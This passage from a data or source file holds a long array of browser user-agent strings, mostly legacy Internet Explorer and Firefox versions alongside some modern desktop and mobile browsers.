		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
		"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Opera/9.80 (Android; Opera Mini/7.5.54678/28.2555; U; ru) Presto/2.10.289 Version/12.02",
    "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; Trident/6.0; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Android 11; Mobile; rv:99.0) Gecko/99.0 Firefox/99.0",
    "Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/99.0.4844.59 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
		"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
		"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0;  rv:11.0) like Gecko",
		"Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
		"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
		"Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
		"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
		"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
		"Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)",
		"Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
		"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/13.0.782.215)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/11.0.696.57)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
		"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.1.76908; WOW64; en-US)",
		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)",
		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.8.36217; WOW64; en-US)",
		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; .NET CLR 2.7.58687; SLCC2; Media Center PC 5.0; Zune 3.4; Tablet PC 3.6; InfoPath.3)",
		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; Media Center PC 4.0; SLCC1; .NET CLR 3.0.04320)",
		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)",
		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)",
		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322)",
		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 3.0.04506.30)",
		"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/4.0; FBSMTWB; .NET CLR 2.0.34861; .NET CLR 3.0.3746.3218; .NET CLR 3.5.33652; msn OptimizedIE8;ENUS)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; Media Center PC 6.0; InfoPath.2; MS-RTC LM 8)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; Media Center PC 6.0; InfoPath.2; MS-RTC LM 8",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 3.0)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; msn OptimizedIE8;ZHCN)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; InfoPath.3; .NET4.0C; .NET4.0E) chromeframe/8.0.552.224",
		"Mozilla/4.0(compatible; MSIE 7.0b; Windows NT 6.0)",
		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; Media Center PC 3.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1)",
		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; FDM; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)",
		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1)",
		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)",
		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar)",
		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.40607)",
		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.0.3705; Media Center PC 3.1; Alexa Toolbar; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
		"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
		"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; el-GR)",
		"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)",
		"Mozilla/5.0 (MSIE 7.0; Macintosh; U; SunOS; X11; gu; SV1; InfoPath.2; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
		"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; WOW64; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; c .NET CLR 3.0.04506; .NET CLR 3.5.30707; InfoPath.1; el-GR)",
		"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; c .NET CLR 3.0.04506; .NET CLR 3.5.30707; InfoPath.1; el-GR)",
		"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; fr-FR)",
		"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; en-US)",
		"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; WOW64; .NET CLR 2.0.50727)",
		"Mozilla/5.0 (compatible; MSIE 7.0; Windows 98; SpamBlockerUtility 6.3.91; SpamBlockerUtility 6.2.91; .NET CLR 4.1.89;GB)",
		"Mozilla/4.79 [en] (compatible; MSIE 7.0; Windows NT 5.0; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
		"Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
		"Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)",
		"Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)",
		"Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.0)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/6.0; .NET4.0E; .NET4.0C)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; InfoPath.3)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100)",
		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
		"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
		"Mozilla/4.0 (compatible; MSIE 6.01; Windows NT 6.0)",
		"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1; DigExt)",
		"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)",
		"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.2.6)",
		"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.0.0) (Compatible;  ;  ; Trident/4.0)",
		"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.0.0)",
		"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0)",
		"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0; .NET CLR 1.0.2914)",
		"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0)",
		"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98; YComp 5.0.0.0)",
		"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98; Win 9x 4.90)",
		"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
		"Mozilla/5.0 (Windows; U; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
		"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
		"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4325)",
		"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
		"Mozilla/45.0 (compatible; MSIE 6.0; Windows NT 5.1)",
		"Mozilla/4.08 (compatible; MSIE 6.0; Windows NT 5.1)",
		"Mozilla/4.01 (compatible; MSIE 6.0; Windows NT 5.1)",
		"Mozilla/4.0 (X11; MSIE 6.0; i686; .NET CLR 1.1.4322; .NET CLR 2.0.50727; FDM)",
		"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 6.0)",
		"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.2)",
		"Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.0)",
		"Mozilla/4.0 (Windows;  MSIE 6.0;  Windows NT 5.1;  SV1; .NET CLR 2.0.50727)",
		"Mozilla/4.0 (MSIE 6.0; Windows NT 5.1)",
		"Mozilla/4.0 (MSIE 6.0; Windows NT 5.0)",
		"Mozilla/4.0 (compatible;MSIE 6.0;Windows 98;Q312461)",
		"Mozilla/4.0 (Compatible; Windows NT 5.1; MSIE 6.0) (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
		"Mozilla/4.0 (compatible; U; MSIE 6.0; Windows NT 5.1) (Compatible;  ;  ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; U; MSIE 6.0; Windows NT 5.1)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3; Tablet PC 2.0)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB6.5; QQDownload 534; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
		"Mozilla/4.0 (compatible; MSIE 5.5b1; Mac_PowerPC)",
		"Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.9; SiteCoach 1.0)",
		"Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8; SiteCoach 1.0)",
		"Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8)",
		"Mozilla/4.0 (compatible; MSIE 5.50; Windows 98; SiteKiosk 4.8)",
		"Mozilla/4.0 (compatible; MSIE 5.50; Windows 95; SiteKiosk 4.8)",
		"Mozilla/4.0 (compatible;MSIE 5.5; Windows 98)",
		"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1)",
		"Mozilla/4.0 (compatible; MSIE 5.5;)",
		"Mozilla/4.0 (Compatible; MSIE 5.5; Windows NT5.0; Q312461; SV1; .NET CLR 1.1.4322; InfoPath.2)",
		"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT5)",
		"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)",
		"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
		"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.1; chromeframe/12.0.742.100; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)",
		"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618)",
		"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.5)",
		"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; FDM)",
		"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322) (Compatible;  ;  ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
		"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
		"Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)",
		"Mozilla/4.0 (compatible; MSIE 5.22; Mac_PowerPC)",
		"Mozilla/4.0 (compatible; MSIE 5.21; Mac_PowerPC)",
		"Mozilla/4.0 (compatible; MSIE 5.2; Mac_PowerPC)",
		"Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)",
		"Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC Mac OS; en)",
		"Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC)",
		"Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
		"Mozilla/4.0 (compatible; MSIE 5.14; Mac_PowerPC)",
		"Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC)",
		"Mozilla/4.0 (compatible; MSIE 5.12; Mac_PowerPC)",
		"Mozilla/4.0 (compatible; MSIE 5.05; Windows NT 4.0)",
		"Mozilla/4.0 (compatible; MSIE 5.05; Windows NT 3.51)",
		"Mozilla/4.0 (compatible; MSIE 5.05; Windows 98; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; YComp 5.0.0.0)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; Hotbar 4.1.8.0)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; DigExt)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT; .NET CLR 1.0.3705)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; MSIECrawler)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; Hotbar 4.2.8.0)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6; Hotbar 3.0)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.6)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.2.4)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0; Hotbar 4.1.8.0)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; YComp 5.0.0.0)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.6)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.3; Wanadoo 5.5)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Wanadoo 5.1)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1; .NET CLR 1.1.4322; .NET CLR 1.0.3705; .NET CLR 2.0.50727)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Q312461; T312461)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Q312461)",
		"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; MSIECrawler)",
		"Mozilla/4.0 (compatible; MSIE 5.0b1; Mac_PowerPC)",
		"Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)",
		"Mozilla/4.0(compatible; MSIE 5.0; Windows 98; DigExt)",
		"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT;)",
		"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.2.6)",
		"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.2.5)",
		"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.0.0)",
		"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; Hotbar 4.1.8.0)",
		"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; Hotbar 3.0)",
		"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; .NET CLR 1.0.3705)",
		"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)",
		"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT)",
		"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.04506.648; .NET4.0C; .NET4.0E)",
		"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.9; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.2; .NET CLR 1.1.4322)",
		"Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 5.0)",
		"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98;)",
		"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; YComp 5.0.2.4)",
